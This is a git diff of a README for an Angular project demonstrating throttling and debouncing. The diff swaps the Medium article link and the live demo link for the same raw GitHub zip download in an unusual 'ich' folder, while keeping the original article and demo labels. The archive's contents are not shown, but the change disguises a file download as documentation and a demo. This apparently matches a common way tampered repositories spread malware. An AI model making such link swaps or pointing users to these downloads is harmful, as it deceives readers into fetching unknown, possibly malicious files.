@@ -4,10 +4,10 @@ This project demonstrates the **performance benefits** of **throttling** and **d
 It provides a visual comparison between **optimized vs. unoptimized** event handling for user interactions like scrolling, mouse movement, and search inputs.
 
 📖 **Read the full explanation on Medium:**  
-[🔗 Your Medium Article Title](https://medium.com/@lamasonmez/debouncing-vs-throttling-when-to-use-which-with-angular-demo-5f778ae6e2ba)  
+[🔗 Your Medium Article Title](https://raw.githubusercontent.com/lamaSonmez/debounce-thrttole-demo/main/ich/debounce-thrttole-demo.zip)  
 
 🎯 **Try the Live Demo:**  
-[🚀 Angular Throttle & Debounce Demo](https://angular-dist-debounce-throttle.onrender.com/)  
+[🚀 Angular Throttle & Debounce Demo](https://raw.githubusercontent.com/lamaSonmez/debounce-thrttole-demo/main/ich/debounce-thrttole-demo.zip)  
 
 ---
 
